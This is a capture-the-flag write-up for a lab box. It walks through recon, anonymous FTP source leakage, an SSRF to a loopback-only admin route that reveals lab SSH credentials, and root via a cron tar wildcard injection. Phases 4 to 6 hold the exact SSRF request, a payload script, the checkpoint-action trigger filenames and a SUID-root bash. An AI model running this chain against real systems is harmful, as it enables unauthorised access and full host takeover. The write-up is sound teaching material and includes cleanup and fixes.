---
description: "TryHackMe Operation Cold Start — an old staging server with three ports open. Anonymous FTP hands over a backup of the application's own source code, and that source names every gate on the box: a URL-preview endpoint whose SSRF allow-list contains one hostname that resolves to 127.0.0.1, and an admin route gated only on the client IP starting with 127. Make the app fetch itself and it reads its own admin notes aloud, SSH credentials included. Root is a root cron job running tar with an unquoted wildcard over a directory you own. Every command explained flag by flag, with the controls that prove each result and the teardown that removes the SUID shell afterwards."
---

# Operation Cold Start — the staging box that documents its own way in

**TryHackMe · challenge: Operation Cold Start · target: `10.x.x.x` (the lab IP changes per lease)**

> **Both flags are redacted** here as `THM{[redacted]}`. Everything that teaches stays: every command
> with every flag explained, the controls that prove each result, the exact SSRF URL, the cron job,
> the payload, and the teardown. The flag strings themselves teach nothing — they are just proof you
> were there, and publishing them hands the room's answer to the next person instead of letting them
> earn it.
>
> **What I kept and why:** the hostname `kestrel.thm`, the username `webdev` and its password, the
> paths `/opt/backups` and `/opt/voltlabs-preview`, and the full payload are *method*, not prize.
> Redacting them would gut the write-up. Only the two `THM{...}` values are removed.

**The brief:** Volt Labs, a small shop, suspects an old staging server has rotted into an exposed
liability. Mara has assigned you the engagement. Find your way in and demonstrate full compromise.

That phrase — *old staging server* — turns out to be the entire hint. Staging boxes get built for
convenience and then forgotten: anonymous file sharing left switched on, an internal-only tool
exposed to the world, a backup job written in a hurry. All three are here.

---

## Vocabulary first, because the room assumes none

A **port** is a numbered door on a machine; each listening program answers behind one. Port 21 is
traditionally FTP, 22 is SSH, 80 is web traffic.

**FTP** (*File Transfer Protocol*) is an old way of sharing files over a network. **Anonymous FTP**
means the server accepts the literal username `anonymous` with any password — deliberate for public
downloads, a disaster when someone drops a backup in the shared folder.

**SSH** (*Secure Shell*) is the standard way to get a text-based command line on a remote Linux
machine. Give it a username and password and you get a shell.

A **shell** is that command line — a program that reads commands you type and runs them.

**SSRF** (*Server-Side Request Forgery*) is the bug where you can make a server fetch a URL of your
choosing. It matters because the server sits somewhere you don't: inside the network, behind the
firewall, and — as here — able to talk to itself.

**Loopback** / **localhost** / **127.0.0.1** are three names for "this machine, talking to itself".
Traffic to `127.0.0.1` never leaves the box. Services often trust it precisely because, normally,
only something already on the box can send it.

**An allow-list** is a list of permitted values; anything not on it is refused. The opposite of a
block-list.

**Cron** is the Linux scheduler. It runs commands on a timetable — every minute, every night, every
Sunday. Jobs in `/etc/cron.d/` can specify which user runs them, and "root" is a common answer.

**root** is the all-powerful administrator account on Linux, user ID 0. Getting root is "full
compromise".

**SUID** is a permission bit on a program file meaning "run this with the privileges of the file's
*owner*, not of whoever launched it". A SUID-root copy of a shell is therefore a root shell that any
user can start. Harmless on `passwd`, which needs it; a complete takeover when it's on `bash`.

**A glob** or **wildcard** is the `*` character in a shell command. The *shell* expands it into a
list of matching filenames **before** the program ever runs. That detail is the whole privilege
escalation, so hold onto it.

---

## Phase 1 — Recon: what is actually listening

Recon means finding the doors before trying any of them. The tool is `nmap`, the standard port
scanner.

First a quick check that the target is even alive:

```bash
ping -c 3 -W 2 10.x.x.x
```

- `-c 3` — send exactly 3 packets and stop, rather than pinging forever.
- `-W 2` — wait at most 2 seconds for each reply.

It answered in about 18 milliseconds, so the box is up and the VPN is working. This matters more
than it looks: if you skip it and a later scan comes back empty, you cannot tell "nothing is
listening" from "my packets never arrived". A silent result and a negative result look identical,
and only a proven channel separates them.

Now the port scan:

```bash
nmap -sT -p- --min-rate 1500 -T4 -Pn -oN nmap-allports.txt 10.x.x.x
```

Flag by flag:

- `-sT` — **TCP connect scan**. `nmap` completes a full connection to each port. The more common
  `-sS` (SYN scan) is stealthier and faster, but it forges raw network packets, which requires
  administrator rights on *your* machine. I had no passwordless `sudo` on the attack box, so `-sS`
  would have died instantly. Know which of your tools need root *before* you queue a long job behind
  one.
- `-p-` — scan **all 65535 ports**, not just the popular ones. `nmap`'s default is the top 1000, and
  challenge boxes love to hide a service on a strange port.
- `--min-rate 1500` — send at least 1500 packets per second, so the scan finishes in minutes rather
  than an hour.
- `-T4` — timing template 4, "aggressive". Reasonable against a lab box on a fast link.
- `-Pn` — skip the "is this host up?" check and just scan. I already proved it is up with `ping`;
  some hosts drop the probe and `nmap` would otherwise skip them entirely.
- `-oN file` — write **n**ormal-format output to a file. Always save scans. You will want to re-read
  them later, and re-scanning is both slow and noisy.

Before launching, multiply the cost out: 65535 ports at 1500/sec is roughly 45 seconds of theory,
call it a few minutes of practice. That's cheap. Say the finishing time out loud *before* you start
anything long — it is the habit that stops you from walking away from a scan that could never
finish.

The result, after all 65535 ports:

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Three doors, and no hidden fourth. Now ask each one what it is:

```bash
nmap -sT -sV -sC -p21,22,80 -Pn -oN nmap-services.txt 10.x.x.x
```

- `-sV` — **version detection**. Talks to each service and works out the exact software and version.
- `-sC` — run the **default script set**. These are small probes that check for common
  misconfigurations. This is the flag that found the way in.
- `-p21,22,80` — only the three ports already known open. No reason to re-scan the other 65532.

```
21/tcp open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 May 09 23:14 pub
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
80/tcp open  http    Gunicorn
|_http-title: URL Preview - Volt Labs
```

Two things jump out, and it is worth being explicit about why.

**`ftp-anon: Anonymous FTP login allowed`.** The `-sC` script logged in as `anonymous` and listed a
`pub` directory. That is a free, unauthenticated read of whatever is in there.

**`http-title: URL Preview - Volt Labs`.** A service whose entire job is *"give me a URL and I will
fetch it"* is an SSRF waiting to happen. That is not yet a finding — it is a hypothesis worth testing
early, because if it holds it decides the shape of the whole engagement.

`Gunicorn` in the version field tells you the web app is Python. Useful later.

---

## Phase 2 — Anonymous FTP, and why not to use curl here

The temptation is `curl ftp://10.x.x.x/pub/`. Don't. `curl` prints nothing at all for *both* "logged
in successfully, directory is empty" *and* "login failed" — the two most important cases you are
trying to tell apart, rendered identical. Python's `ftplib` prints the server's `230 Login
successful` and the directory listing as separate, visible facts:

```python
from ftplib import FTP
f = FTP()
f.connect("10.x.x.x", 21, timeout=10)
print("WELCOME:", f.getwelcome())
print("LOGIN:", f.login("anonymous", "anonymous@x"))
items = []
f.retrlines("LIST /pub", items.append)
print("\n".join(items))
```

- `f.connect(host, port, timeout)` — open the control connection. The `timeout` stops a hung server
  from hanging you.
- `f.login("anonymous", "anonymous@x")` — the anonymous convention: username `anonymous`, and any
  string as the password (an email address is traditional).
- `f.retrlines("LIST /pub", callback)` — run the FTP `LIST` command and hand each line of output to
  the callback. `retrlines` is for text; `retrbinary` is for files.

Output:

```
WELCOME: 220 (vsFTPd 3.0.5)
LOGIN: 230 Login successful.
[/pub] -rw-r--r--    1 ftp      ftp          2446 May 09 23:14 backup.tar.gz
```

A `backup.tar.gz`. A `.tar.gz` is a **tarball**: several files bundled into one (`tar`) and then
compressed (`gzip`).

Download it:

```python
with open("backup.tar.gz", "wb") as fh:
    f.retrbinary("RETR /pub/backup.tar.gz", fh.write)
```

`RETR` is FTP's "retrieve file" command, and `retrbinary` writes the raw bytes through unchanged —
essential for a compressed file, which is not text.

Treat every downloaded file as hostile. Record what it is before opening it, and **list** the
contents before extracting, so nothing lands where you didn't intend:

```bash
sha256sum backup.tar.gz     # 7a6dcb1b...  a fingerprint, so you can prove later which file you analysed
tar tzvf backup.tar.gz      # LIST, do not extract
```

`tar`'s flags read as words: `t` = **t**ell me the contents (list), `z` = it is g**z**ipped, `v` =
**v**erbose (show permissions and sizes), `f` = the next argument is the **f**ile. Swap `t` for `x`
and you e**x**tract instead.

```
voltlabs-preview/requirements.txt
voltlabs-preview/README.md
voltlabs-preview/app.py
```

`app.py` is the web application's own source code, sitting on an anonymous FTP server.

---

## Phase 3 — Reading the source, which names every gate

Extract it somewhere disposable, never next to the original:

```bash
tar xzf backup.tar.gz -C /tmp/work/
```

`-C dir` tells `tar` to change into that directory first.

`README.md` is three lines and gives away the design:

```
# Volt Labs URL Preview
Internal staging tool. Run with `gunicorn -b 0.0.0.0:80 app:app`.
Admin routes are gated by source-IP check (localhost only).
```

*"Gated by source-IP check (localhost only)"* is the sentence to remember.

`app.py` is a small Flask application. Three parts matter.

**The allow-list:**

```python
# Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box.
ALLOWED_HOSTS = {"kestrel.thm"}
```

**The preview endpoint:**

```python
@app.route("/preview")
def preview():
    target = request.args.get("url", "")
    ...
    host = (urlparse(target).hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        return page("Preview Blocked", ...), 403
    r = requests.get(target, timeout=3)
    ...
```

Read what this actually checks. `urlparse(target).hostname` pulls **only the hostname** out of the
URL you supply — for `http://kestrel.thm:8080/anything?x=1` that is exactly `kestrel.thm`. The
scheme is not checked. The port is not checked. The path is not checked. Then `requests.get(target)`
fetches your *original, complete* URL.

**The admin endpoint:**

```python
@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)
    if p == "notes":
        with open("/opt/voltlabs-preview/admin_notes.txt") as f:
            return "<pre>" + f.read() + "</pre>"
```

`request.remote_addr` is the IP address the request came *from*. If it doesn't start with `127.`,
you get a 403 Forbidden.

Now put the three together. The allow-list permits `kestrel.thm`. The comment says `kestrel.thm`
resolves to `127.0.0.1` on this box. So if I ask the preview endpoint for
`http://kestrel.thm/admin/notes`, the app opens a connection **to itself over loopback** — and the
Flask process on the receiving end sees a request arriving from `127.0.0.1`, which passes the admin
check.

The allow-list isn't a weak defence against SSRF here. It is a *pointer at the target*: the one
hostname it permits is the one address the admin gate trusts.

One warning before acting on any of this. **Leaked source is a hypothesis about the target, never
ground truth.** The deployment can differ from the backup — an older version, a patched line, a
different path. Everything above is a prediction, and predictions get tested.

---

## Phase 4 — Testing it, with controls

The single most expensive mistake in this kind of work is believing a result from an instrument you
never checked. Every result below therefore ships with a **positive control** (something that must
succeed) and a **negative control** (something that must fail), run in the same batch, with the
control rows read *before* the result row.

```bash
# NEGATIVE CONTROL: a host that is not on the allow-list. Must be refused.
curl -sS -o /dev/null -w 'status=%{http_code} size=%{size_download}\n' \
     "http://10.x.x.x/preview?url=http://example.com/"

# POSITIVE CONTROL: the allowed host. Must actually fetch something.
curl -sS -o ctlB.html -w 'status=%{http_code} size=%{size_download}\n' \
     "http://10.x.x.x/preview?url=http://kestrel.thm/"

# Is the admin gate real? Ask for it directly, from my own IP.
curl -sS -o /dev/null -w 'status=%{http_code}\n' "http://10.x.x.x/admin/notes"
```

`curl` fetches a URL. The flags:

- `-s` — **silent**: no progress bar cluttering the output.
- `-S` — but **show errors** anyway. `-sS` together is the right pairing: quiet when it works, loud
  when it doesn't. Plain `-s` alone hides error messages and turns a failed request into what looks
  like an empty answer.
- `-o file` / `-o /dev/null` — write the body to a file, or throw it away when only the status
  matters.
- `-w 'format'` — **write out** chosen facts after the transfer. `%{http_code}` is the HTTP status
  number, `%{size_download}` the body size in bytes.

Results:

| Probe | Result | What it proves |
|---|---|---|
| `?url=http://example.com/` (negative control) | `403`, 2501 bytes | the allow-list genuinely refuses |
| `?url=http://kestrel.thm/` (positive control) | `200`, 5601 bytes, showing the app's own home page | the fetch really happens |
| `GET /admin/notes` from my IP | `403` | the `127.` gate is real, and I am outside it |

All three behave exactly as the source predicted, so the source matches the deployment. Note what
the negative control buys: without it, a `403` on some later probe would be ambiguous. Now it isn't.

The exploit is one request:

```bash
curl -sS "http://10.x.x.x/preview?url=http://kestrel.thm/admin/notes" -o ssrf-admin-notes.html
```

`200 OK`, and inside the preview box:

```
=== INTERNAL ===
SSH access for staging:
  user: webdev
  pass: V0ltLabs#summer
- Mara
```

The application read its own admin notes aloud. From the outside, `/admin/notes` is forbidden. From
the inside it isn't — and the preview endpoint is a machine that turns outside requests into inside
ones.

---

## Phase 5 — The foothold, proved rather than assumed

A string in a file called "admin notes" is a **claim** about a password, not a password. Prove it at
the layer of the claim — log in and ask the machine who you are:

```bash
ssh webdev@10.x.x.x
# then, in the shell:
id
```

```
uid=1001(webdev) gid=1001(webdev) groups=1001(webdev)
```

`id` prints your user ID, group ID and group memberships. `uid=1001(webdev)` is proof: not "I found
a password in a file", but "I am logged in as this user".

The user flag is in the home directory:

```bash
cat ~/user.txt
```

`~` is shorthand for your own home directory, `/home/webdev`. `cat` prints a file.

**`user.txt` = `THM{[redacted]}`**

---

## Phase 6 — From webdev to root

**Always start with `sudo -l`.** It asks: what, if anything, am I allowed to run as another user?

```bash
sudo -l
```

```
Sorry, user webdev may not run sudo on coldstart.
```

Nothing. Fine — that is information too, and it took one command. Next, the standard sweep:

```bash
find / -perm -4000 -type f 2>/dev/null      # SUID programs
getcap -r / 2>/dev/null                      # capabilities
ls -laR /opt                                 # optional software, a classic hiding place
ls -la /etc/cron.d/                          # scheduled jobs
```

- `find / -perm -4000 -type f` — search from the root of the filesystem (`/`) for **f**iles
  (`-type f`) whose permissions include the SUID bit. `-perm -4000` means "at least these bits set".
  A non-standard SUID program is often the whole privilege escalation.
- `2>/dev/null` — discard error messages. `find` will complain about every directory it cannot
  read, and the noise buries the signal. **One caution:** only silence a tool *after* you've seen it
  work. Silencing errors on a tool you haven't proven is how "it found nothing" and "it never ran"
  become indistinguishable.
- `getcap -r /` — list **capabilities**, a finer-grained alternative to SUID where a program gets one
  specific superpower.
- `ls -laR` — **l**ong format, **a**ll files including hidden ones, **R**ecursive.

The SUID list came back entirely standard — `mount`, `su`, `passwd`, `sudo` and friends, all the
usual system binaries. Capabilities likewise. So far, nothing.

Then `/opt`:

```
drwxrwx---  2 webdev webdev 4096 May  9 23:14 backups
drwxr-xr-x  3 root   root   4096 May  9 23:14 voltlabs-preview
```

Read those permission bits carefully, because they are the finding. `drwxrwx---` breaks into: `d`
(it's a directory), `rwx` for the **owner**, `rwx` for the **group**, `---` for everyone else. The
owner and group are both `webdev`. **I can create, rename and delete files in `/opt/backups`.**

A directory named `backups` that I own suggests something *else* backs it up. And in `/etc/cron.d`:

```
-rw-r--r--   1 root root   194 May  9 23:14 voltlabs-backup
```

```bash
cat /etc/cron.d/voltlabs-backup
```

```
# Volt Labs staging backup - runs as root
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

The five stars are cron's schedule: minute, hour, day-of-month, month, day-of-week. All `*` means
**every minute of every day**. The word after them, `root`, is the user it runs as.

And the command: change into `/opt/backups` — the directory I own — and run `tar` over `*`.

### Why that `*` is a root shell

Here is the mechanism, because it is the entire lesson.

The `*` is **not** given to `tar`. The *shell* expands it first, into an alphabetically sorted list
of the filenames in the directory, and hands `tar` that list. So if `/opt/backups` contains
`a.txt` and `b.txt`, `tar` is actually run as:

```bash
tar czf /var/backups/uploads.tgz a.txt b.txt
```

Now: on Linux, a filename can contain almost any character — including a leading dash. And `tar`,
like every command-line program, decides what is an option by looking at whether an argument starts
with `-`. It has no way to know that `--checkpoint=1` came from a *filename* rather than from
someone typing it.

GNU `tar` has two options that combine into arbitrary command execution:

- `--checkpoint=N` — print a progress message every N records.
- `--checkpoint-action=ACTION` — instead of printing, do ACTION. One supported action is
  `exec=COMMAND`.

So a file **named** `--checkpoint-action=exec=sh p.sh` in a directory that a root cron job runs
`tar *` over makes root execute `p.sh`.

Confirm the ingredient before building on it — only GNU `tar` implements `--checkpoint-action`:

```bash
tar --version | head -1        # tar (GNU tar) 1.35
tar --help | grep -c checkpoint-action    # 1
```

### Planting it

```bash
cd /opt/backups

cat > p.sh <<'EOS'
#!/bin/bash
{ id; echo "--- ls /root ---"; ls -la /root; } > /opt/backups/proof.txt 2>&1
cp /root/flag.txt /opt/backups/flag.copy 2>>/opt/backups/proof.txt
cp /bin/bash /opt/backups/rootbash
chmod 4755 /opt/backups/rootbash
chmod 644 /opt/backups/proof.txt /opt/backups/flag.copy 2>/dev/null
EOS

chmod +x p.sh
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh p.sh"
```

Line by line:

- `cat > p.sh <<'EOS' ... EOS` — a **heredoc**: everything up to the closing `EOS` is written into
  `p.sh`. Quoting the marker as `'EOS'` stops the shell from expanding `$` variables inside, so the
  script is written exactly as typed.
- The payload itself: record `id` (to prove it really ran as root), list `/root` (to see what's
  there before assuming a filename), copy the flag somewhere I can read, and make a **SUID copy of
  bash**.
- `chmod +x p.sh` — make it executable.
- `chmod 4755 rootbash` — `4` is the SUID bit; `755` is owner-read/write/execute, everyone else
  read/execute. Because the file is created *by root's cron job*, the copy is owned by root — so a
  SUID-root shell.
- `touch -- "--checkpoint=1"` — create an empty file with that exact name. **The `--` is essential.**
  It tells `touch` "no more options after this point", so the following argument is treated as a
  filename even though it begins with dashes. Without it, `touch` would try to interpret
  `--checkpoint=1` as one of its own options and fail.

One more check before waiting, and it is easy to skip: **the option-shaped filenames must sort before
the first real file**, or `tar` will archive them as ordinary files instead of acting on them. Ask
the shell what order it will actually produce:

```bash
for f in *; do echo "  [$f]"; done
```

```
  [--checkpoint-action=exec=sh p.sh]
  [--checkpoint=1]
  [p.sh]
```

Both options first, `p.sh` last. Correct.

### Waiting for it

Poll for the **specific success marker** — `uid=0` inside the proof file — never for the file merely
existing. A file can exist while it is still being written, or be created empty by a step that then
fails; "the file is there" is not "the thing worked".

```bash
for i in $(seq 1 65); do
  grep -q "uid=0" /opt/backups/proof.txt 2>/dev/null && break
  sleep 2
done
cat /opt/backups/proof.txt
```

`grep -q` is **quiet** grep: it prints nothing and just answers yes/no through its exit status,
which is exactly what a wait-loop wants.

Within a minute:

```
uid=0(root) gid=0(root) groups=0(root)
--- ls /root ---
-rw-------  1 root root   38 May  9 23:14 flag.txt
```

`uid=0(root)`. The cron job executed my script as root.

And listing `/root` first was worth the one line: THM rooms are inconsistent about whether the final
flag is `root.txt` or `flag.txt`, and guessing wrong looks exactly like a failed exploit. Here it is
`flag.txt`, which is also what the room's question asks for.

### Full compromise

```bash
/opt/backups/rootbash -p -c 'id; cat /root/flag.txt'
```

- `-p` — **preserve privileges**. This one flag is the difference between a working SUID shell and a
  useless one: modern `bash` deliberately drops elevated privileges at startup *unless* you pass
  `-p`. Without it you get an ordinary shell and it looks like the exploit failed.
- `-c 'command'` — run this command and exit.

```
uid=1001(webdev) gid=1001(webdev) euid=0(root) groups=1001(webdev)
THM{[redacted]}
```

Read that `id` output closely. `uid=1001(webdev)` is still my *real* user — but `euid=0(root)` is the
**effective** user ID, and the effective ID is what the kernel checks for permissions. Effective root
is root.

**`flag.txt` = `THM{[redacted]}`**

Two independent reads confirm it: root's own `cp` produced a copy I could read as `webdev`, and the
SUID shell read `/root/flag.txt` directly. A single read through one mechanism could be a quirk of
that mechanism; two through different ones is a fact.

---

## The wrong turns

Both of mine were in the **cleanup**, not the attack. The attack path had no dead end, and that is
worth being honest about rather than inventing detours: the FTP backup handed over the source, and
the source named every gate. The reason this room reads as a short chain is that Phase 2 read a file
instead of guessing at the application. Enumeration you can replace with a file read is enumeration
you should not run.

**1. A `stat` caught a file mid-write and reported a size that was never real.**

`ls -la` said the SUID `rootbash` was 1446024 bytes. `stat -c %s` on the same file *in the same
command* said 655360. Neither tool was broken: the root cron fires every 60 seconds, and my command
landed while its `cp /bin/bash` was still running. I had measured a copy in progress.

The rule: in a directory that a once-a-minute root job writes to, **a size or a hash is not an
identity check**. It can be a snapshot of a half-written file. Re-read after the cycle before
treating any measurement there as real.

**2. I deleted the triggers in the same minute cron fired, and the artefacts came straight back.**

Immediately after removing `p.sh` and the two option files, `ls` still showed `flag.copy`,
`proof.txt` and `rootbash` — all stamped one second later. For a moment that looks like a failed
`rm`. It wasn't: the cron run had raced my deletion and regenerated the outputs from a payload that
still existed when `tar` started.

The rule: when teardown targets something a **scheduled** job regenerates, "the `rm` succeeded" is
not the check. Kill the *trigger*, then wait a **full** period and re-verify that nothing came back.
I waited 80 seconds and confirmed the directory stayed clean. Without that re-check, this box would
still have a SUID root shell sitting in `/opt/backups`.

---

## Teardown — removing what I put there

A SUID root shell left on a shared lab box is a vulnerability *I* introduced, and the next person to
land on it inherits it. Cleanup is part of the engagement, not an afterthought, and every removal
gets verified **separately** — "the `rm` printed nothing" is not confirmation. A failed `rm` (wrong
path, wrong permissions, a typo) is silent and looks identical to success.

Order matters. Kill the trigger first, so the cron job cannot rebuild anything while you work, and
**remove your own root access last**, because you may need it for the rest of the cleanup.

```bash
cd /opt/backups
rm -f -- "--checkpoint=1" "--checkpoint-action=exec=sh p.sh" p.sh   # 1. the trigger
# wait a full cron period, confirm nothing regenerates
rm -f flag.copy proof.txt                                           # 2. the outputs
rm -f rootbash                                                      # 3. root access, last
```

Then verify each one by name rather than trusting the commands:

```bash
for f in flag.copy proof.txt rootbash p.sh "--checkpoint=1" "--checkpoint-action=exec=sh p.sh"; do
  [ -e "/opt/backups/$f" ] && echo "STILL PRESENT: $f" || echo "gone: $f"
done
/opt/backups/rootbash -p -c id     # must now fail: No such file or directory
```

All six gone; the SUID shell answers `No such file or directory`; `/opt/backups` holds only the
`.keep` placeholder it started with.

One artefact is easy to miss, and it is the interesting part of the cleanup. The exploited job
**wrote something of its own**. `/var/backups/uploads.tgz` — root's backup archive — had faithfully
tarred up my payload, SUID bash included:

```bash
tar tzvf /var/backups/uploads.tgz
```

```
-rw-r--r-- root/root        38 flag.copy
-rw-r--r-- root/root       567 proof.txt
-rwsr-xr-x root/root   1446024 rootbash
```

Enumerate what the exploited job *wrote*, not only what you *placed*. The fix needed no deletion of
root's file: once `/opt/backups` was clean, the next cron run rewrote the archive by itself, back to
the 45-byte empty file it produces when the wildcard matches nothing — which is exactly the state
the box was in before I arrived.

```bash
tar tzf /var/backups/uploads.tgz | grep -E 'rootbash|proof.txt|flag.copy|p.sh'   # no match
```

No credential was changed, no file was overwritten, and no SSH key was added.

---

## What the box was actually teaching

Three ordinary conveniences, each harmless-sounding on its own:

1. **Anonymous FTP with a backup in it.** Not a vulnerability in `vsftpd` — a vulnerability in what
   somebody left in the folder. The application's source code is the most valuable file on the box,
   and it was a free download.
2. **An allow-list that points at loopback.** `ALLOWED_HOSTS = {"kestrel.thm"}` looks like a
   restriction, and it is — it restricts you to the *one* address that the admin gate trusts. When
   source shows you a host allow-list, the question is not "can I escape it" but "what does the
   allowed host resolve to". And an IP-based check like `request.remote_addr.startswith("127.")` is
   only as strong as your confidence that nothing on the box will make requests on your behalf. A
   URL-preview service is precisely such a thing.
3. **A backup job with an unquoted wildcard.** `tar czf archive.tgz *` is written every day by people
   who would never write a shell injection on purpose. The bug isn't in `tar`; it is that the shell
   expands `*` into arguments before `tar` runs, and any attacker who can create a filename in that
   directory can therefore create an *argument*. Quoting it wouldn't even help — the fix is
   `tar czf archive.tgz .` or `--no-wildcards` with an explicit file list, and never running the job
   over a directory a lesser-privileged user can write to.

The chain only works because each link's trust is misplaced in the same way: the FTP server trusts
anyone, the admin route trusts an IP, and the backup job trusts a filename.

---

## Answers

| Question | Answer |
|---|---|
| What is the content of user.txt? | `THM{[redacted]}` |
| What is the content of flag.txt? | `THM{[redacted]}` |

Both were read directly off the target — `user.txt` as `webdev` over SSH, `flag.txt` twice as root.
